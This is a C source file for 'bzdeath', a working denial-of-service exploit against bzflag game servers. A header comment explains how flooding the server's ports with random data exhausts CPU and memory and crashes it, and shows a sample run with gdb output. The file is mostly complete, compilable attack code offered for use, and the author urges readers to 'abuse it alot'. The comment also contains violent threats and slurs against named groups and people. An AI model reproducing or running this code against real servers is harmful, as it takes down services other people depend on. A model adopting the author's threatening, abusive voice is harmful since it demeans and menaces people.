/* bzdeath.c by the russian code molester

   bzflag [bzflag.org] is a multiplayer 3D tank battle game, a bugfest
   and a cheaters heaven. bzflag listens on at least two tcp ports, one
   port feeding us the bzfs [bzflag server] version and reconnect port,
   and the other one where the real fun begins. force feeding these ports
   with some magic fairy powder can make bzfs go insane and eat itself.

   .. oi oi, what be this magik?! ..

   first, we connect to the target bzflag server and read the reconnect
   port data, 9th and 10th byte of handshake. then we reconnect to this
   port and flood it with random garbage, causing a cpu/mem leak in bzfs,
   making the cpu usage skyrocket. then, if that does not make the server
   go down, we reconnect back to the initial port and flood that too,
   causing havoc and total mayhem (segfault) to our little bzfs friend.

   this seems to work best on *fast* connections, LAN etc. however it has
   been tested quite sucessfully on slower connections as well (but don't
   get get your hopes up) - and note, even if the server does not die,
   the cpu/mem leak might still be triggered, munching away at all those
   precious cpu cycles.

   bzdeath.c compiles successfully under fbsd and linux.

   .. vulnerable versions ..

   this has only been tested on the newest stable release, 1.7g0, but I
   suspect that it will work just as good on the older ones as well.

   .. real life example ..

   ~$ gcc bzdeath.c -o bzdeath -O2 -Wall && ./bzdeath 10.0.2.36 5155
     -- connecting to 10.0.2.36:5155 ..
     -- connection established!
     -- recv(): 42 5a 46 53 31 30 37 65 14 24
     -- bzfs signature confirmed
     -- reconnect port is 5156
     -- connecting to 10.0.2.36:5156 ..
     -- connection established, attacking!
     -- 303 packets / 155136 bytes sent
     -- send() timeout
     -- reconnecting to 10.0.2.36:5155 ..
     -- attacking!
     -- 303 packets / 155136 bytes sent
     -- send() failed, reconnecting ..
     -- unable to connect, DoS successful?

   and on 10.0.2.36 gdb tells us,

   "Program received signal SIGSEGV, Segmentation fault.
    0x0805838b in alarm ()"

   .. final words form the dark side ..

   abuse it alot, and stay tuned for the upcoming stack smashing shell-
   spawning chachacha exploit for bzflag, soon to be released.

   oh, and if you can't make this work, blame yo mama, and if you haven't
   got one, blame someone else.

   and if those WHORES at neworder.box.sk put this file in their "latest
   vulnerabilities" section I will hunt them down and rip them apart with
   rusty nail clippers and chopsticks!

   and finally a big fuckyou-and-I-am-going-to-kill-all-of-you goes to
   electronic souls for being code stealing cockeaters, and dvdman for
   being born without both a brain and a penis.

   take care,
   -- russian code molester

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <signal.h>

#define BUFSIZE 512
#define TIMEOUT 10

int sockconnect(char*, int);
int sockattack();
void sigalrm_handler();
void sigpipe_handler();
void die(char*);
void banner();
void usage();

int sockfd;
int recon_port;
int orig_port;
char host[128];

int main(int argc, char **argv) {
  int i;
  char buf[BUFSIZE];
  char bzsign[8];

  if(argc < 3) usage();

  snprintf(host, sizeof host, "%s", argv[1]);
  orig_port = atoi(argv[2]);

  banner();

  srand(time(0));
  bzero(buf, sizeof buf);

  signal(SIGALRM, sigalrm_handler);
  signal(SIGPIPE, sigpipe_handler);

  printf(" -- connecting to %s:%s ..\n", argv[1], argv[2]);

  if(sockconnect(host, orig_port) == -1)
    die("unable to connect");

  printf(" -- connection established!\n");

  if(recv(sockfd, buf, 16, 0) <= 0)
    die("recv() failed");

  printf(" -- recv(): ");

  for(i = 0; i < strlen(buf); i++)
    printf("%02x ", buf[i]);

  printf("\n");

  sprintf(bzsign, "%c%c%c%c", buf[0], buf[1], buf[2], buf[3]);

  if(!strcmp(bzsign, "BZFS"))
    printf(" -- bzfs signature confirmed\n");
  else die("bzfs signature mismatch (NOT bzflag server)");

  if(strlen(buf) >= 10)
    recon_port = (((int) buf[strlen(buf) - 2]) << 8) | buf[strlen(buf) -
1];
  else die("server did not send reconnect port");

  if(recon_port >= 64 * 1024 || recon_port <= 0)
    die("server sent illegal reconnect port");

  printf(" -- reconnect port is %d\n", recon_port);
  printf(" -- connecting to %s:%d ..\n", host, recon_port);

  close(sockfd);

  if(sockconnect(host, recon_port) == -1)
    die("unable to connect");

  printf(" -- connection established, attacking!\n");

  while(1) {
    sockattack();
    close(sockfd);

    sleep(1);

    if(sockconnect(argv[1], recon_port) == -1)
      break;
  }

  printf(" -- unable to connect, DoS successful?\n");

  return 0;
}

int sockconnect(char *host, int port) {
  struct hostent *he;
  struct sockaddr_in remote_addr;

  if((he = gethostbyname(host)) == NULL)
    return -1;

  remote_addr.sin_family = AF_INET;
  remote_addr.sin_addr = *((struct in_addr *)he->h_addr);
  remote_addr.sin_port = htons(port);
  memset(&(remote_addr.sin_zero), 0x00, 8);

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    return -1;

  if(connect(sockfd, (struct sockaddr *)&remote_addr,
                                       sizeof(struct sockaddr)) == -1)
    return -1;

  return 0;
}

int sockattack() {
  char buf[BUFSIZE];
  unsigned long attack_packets = 0;
  int i;

  while(1) {
    alarm(TIMEOUT);

    for(i = 0; i < sizeof buf; i++)
      buf[i] = rand() % 256;

    attack_packets++;
    printf("\r -- %ld packets / %ld bytes sent ", attack_packets,
                                              attack_packets * sizeof
buf);
    fflush(stdout);

    if(send(sockfd, buf, sizeof buf, 0) != sizeof buf) {
      printf("\n -- send() failed, reconnecting ..\n");
      break;
    }

  }

  return 0;
}

void sigalrm_handler() {
  printf("\n -- send() timeout\n");
  close(sockfd);

  printf(" -- reconnecting to %s:%d ..\n", host, orig_port);

  if(sockconnect(host, orig_port) == -1)
    die("unable to connect, DoS successful?");

  printf(" -- attacking!\n");
  sockattack();

  return;
}

void sigpipe_handler() {
  printf("\n");
  die("got SIGPIPE, target dead?");
  return;
}

void die(char *text) {
  fprintf(stderr, " -- error: %s\n", text);
  exit(1);
}

void banner(void) {
  printf("B Z D E A T H . c by russian code molester . . .\n");
  return;
}

void usage(void) {
  fprintf(stderr, "usage: bzdeath <host> <port>\n");
  exit(1);
}
